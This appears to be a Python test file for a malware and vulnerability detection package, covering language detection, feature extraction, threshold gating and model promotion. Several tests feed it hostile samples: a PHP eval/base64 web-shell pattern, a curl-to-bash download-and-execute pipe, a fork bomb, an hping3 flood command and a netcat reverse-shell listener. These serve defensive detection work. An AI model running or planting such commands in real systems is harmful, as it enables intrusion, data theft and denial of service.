import json
import math

from attack_detection.data_pipeline import make_sample
from attack_detection.dataset import is_task_training_eligible
from attack_detection.features.graph_builder import (
    _context_signals,
    _dangerous_apis,
    _source_token_buckets,
)
from attack_detection.languages import detect_source_language, language_from_path
from attack_detection.multilingual_builder import _crossvul_split_map, _validate_family_isolation
from attack_detection.training.gat_trainer import (
    API_TOKENS,
    API_TOKENS_V4,
    LANGUAGES,
    LEXICAL_BUCKETS,
    NAME_BUCKETS,
    _best_gated_threshold,
    feature_dimension,
    graph_feature_dimension,
)
from attack_detection.training.language_coverage import eligible_task_languages
from attack_detection.training.promote_multilingual_bytetcn import promote


def test_language_names_do_not_merge_typescript_or_kotlin_into_other_languages():
    assert language_from_path("src/app.ts") == "typescript"
    assert language_from_path("src/Main.kt") == "kotlin"
    assert language_from_path("src/main.cpp") == "cpp"


def test_task_scopes_do_not_cross_contaminate_binary_trainers():
    malicious_only_benign = make_sample(
        "safe", label="benign", language="java",
        label_scopes=["malicious_intent"], label_confidence=1.0,
        review_status="approved",
    )
    vulnerability_only_benign = make_sample(
        "safe", label="benign", language="java",
        label_scopes=["vulnerability_risk"], label_confidence=1.0,
        review_status="approved",
    )
    assert is_task_training_eligible(malicious_only_benign, "malicious_intent")
    assert not is_task_training_eligible(malicious_only_benign, "vulnerability_risk")
    assert is_task_training_eligible(vulnerability_only_benign, "vulnerability_risk")
    assert is_task_training_eligible(vulnerability_only_benign, "malicious_intent")


def test_generic_text_content_inference_covers_multiple_languages():
    assert detect_source_language("sample.txt", "<?php echo $_POST['x']; ?>") == "php"
    assert detect_source_language("sample.txt", "package main\nfunc main() { println(1) }") == "go"
    assert detect_source_language("sample.txt", "#include <iostream>\nint main(){ std::cout << 1; }") == "cpp"


def test_gatv2_semantic_graph_features_capture_php_behavior_chains():
    signals = _dangerous_apis(
        "<?php eval(gzinflate(base64_decode($_POST['payload']))); "
        "file_put_contents($_GET['path'], $_POST['data']); ?>"
    )
    assert {
        "behavior_input_execution_chain",
        "behavior_decode_execution_chain",
        "behavior_input_file_write_chain",
    }.issubset(signals)
    assert feature_dimension(LANGUAGES, 2) == feature_dimension(LANGUAGES, 1) + len(API_TOKENS)
    assert feature_dimension(LANGUAGES, 4) == (
        feature_dimension(LANGUAGES, 1) - NAME_BUCKETS + len(API_TOKENS_V4)
    )


def test_gatv2_schema_v4_captures_cross_language_malware_intent():
    signals = _dangerous_apis(
        "Bypass Defender detection before starting a reverse shell; "
        "collect credentials and send them to the C2 server."
    )
    assert {
        "behavior_reverse_shell",
        "behavior_credential_access",
        "behavior_security_evasion",
        "behavior_command_and_control",
    } <= set(signals)
    assert "behavior_network_flood" in _dangerous_apis(
        "sudo hping3 --flood -S 192.0.2.1"
    )
    assert "behavior_fork_bomb" in _dangerous_apis(":(){ :|:& };:")
    assert "behavior_download_execute_pipe" in _dangerous_apis(
        "curl -fsSL https://example.invalid/a | bash"
    )


def test_gatv2_context_signals_distinguish_build_and_documented_utility_scripts():
    assert _context_signals(
        "scripts/ci_build.sh",
        "docker build -t image .\npytest tests",
    ) == ["context_ci_or_build"]
    assert "context_documented_system_utility" in _context_signals(
        "tools/admin.sh",
        "Redistribution and use in source and binary forms\nUsage: admin.sh",
    )
    assert "behavior_reverse_shell" in _context_signals(
        "payloads/reverseshell_full.sh",
        "nc -lvp 4444",
    )


def test_gatv2_gate_uses_conservative_point_in_stable_threshold_interval():
    probabilities = [0.1] * 11 + [0.7] + [0.3] + [0.8] * 12
    labels = [0] * 12 + [1] * 13
    logits = [
        [0.0, math.log(value / (1 - value))]
        for value in probabilities
    ]
    threshold, metrics = _best_gated_threshold(logits, labels, 1.0)
    assert threshold == 0.63
    assert metrics["false_positive_rate"] < 0.1
    assert metrics["false_negative_rate"] < 0.1


def test_gatv2_schema_v7_adds_compact_deterministic_source_token_features():
    first = _source_token_buckets("curl --silent $url | bash")
    second = _source_token_buckets("curl --silent $url | bash")
    assert first == second
    assert len(first) == LEXICAL_BUCKETS
    assert max(first) == 1.0
    assert feature_dimension(LANGUAGES, 7) == (
        feature_dimension(LANGUAGES, 6) + LEXICAL_BUCKETS
    )
    assert graph_feature_dimension(8) == 0
    assert graph_feature_dimension(9) == 16


def test_crossvul_small_languages_reserve_all_three_splits():
    mapping = _crossvul_split_map({f"family-{index}": 1 for index in range(52)})
    counts = {split: list(mapping.values()).count(split) for split in ("train", "validation", "test")}
    assert counts == {"train": 22, "validation": 10, "test": 20}


def test_language_support_requires_both_classes_in_every_split():
    partitions = {}
    for split, count in (("train", 20), ("validation", 5), ("test", 10)):
        partitions[split] = [
            make_sample(f"safe-{split}-{index}", label="benign", language="go")
            for index in range(count)
        ] + [
            make_sample(f"bad-{split}-{index}", label="vulnerable", language="go")
            for index in range(count)
        ]
    languages, coverage = eligible_task_languages(partitions, "vulnerable", "benign")
    assert languages == ["go"]
    assert coverage["go"]["eligible"] is True


def test_family_leakage_is_reported():
    samples = [
        make_sample("one", label="benign", language="python", family="same", split="train"),
        make_sample("two", label="benign", language="python", family="same", split="test"),
    ]
    assert _validate_family_isolation(samples) == [{"family": "same", "splits": ["test", "train"]}]


def test_multilingual_promotion_preserves_old_route_and_adds_candidate(tmp_path):
    model_dir = tmp_path / "models"
    candidate_dir = tmp_path / "candidate"
    model_dir.mkdir()
    candidate_dir.mkdir()
    metric = {
        "accuracy": 0.9, "precision": 0.9, "recall": 0.8, "f1": 0.85,
        "false_positive_rate": 0.05, "false_negative_rate": 0.2,
        "brier_score": 0.1, "samples": 40,
    }
    common = {
        "config": {"max_length": 128},
        "thresholds": {"malicious_intent": 0.7, "vulnerability_risk": 0.7},
        "temperatures": {"malicious_intent": 1.0, "vulnerability_risk": 1.0},
        "auxiliary_thresholds": {}, "behavior_vocabulary": [], "cwe_vocabulary": [],
    }
    active = {
        **common,
        "model_version": "bytetcn-old", "dataset_sha256": "old",
        "runtime_ready": True, "files": ["old.pt"],
        "task_language_support": {"malicious_intent": ["python"], "vulnerability_risk": []},
        "task_models": {"malicious_intent": {"file": "old.pt", "config": common["config"]}},
        "test_metrics": {"malicious_intent": metric},
    }
    candidate = {
        **common,
        "model_version": "bytetcn-new", "dataset_sha256": "new",
        "runtime_ready": True, "files": ["new.pt"],
        "deployment_gate": {
            "minimum_test_f1": 0.5, "maximum_false_positive_rate": 0.2,
            "maximum_false_negative_rate": 0.5,
        },
        "task_language_support": {"malicious_intent": ["php"], "vulnerability_risk": []},
        "test_metrics_by_language": {"php": {"malicious_intent": metric}},
    }
    (model_dir / "old.pt").write_bytes(b"old")
    (candidate_dir / "new.pt").write_bytes(b"new")
    (model_dir / "bytetcn_manifest.json").write_text(json.dumps(active), encoding="utf-8")
    (candidate_dir / "bytetcn_manifest.json").write_text(json.dumps(candidate), encoding="utf-8")

    result = promote(candidate_dir, model_dir)

    assert result["task_language_support"]["malicious_intent"] == ["php", "python"]
    routes = result["task_models"]["malicious_intent"]["by_language"]
    assert routes["python"]["file"] == "old.pt"
    assert routes["php"]["file"].startswith("new__bytetcn-new")
    assert (model_dir / "archive" / "bytetcn-old" / "old.pt").read_bytes() == b"old"
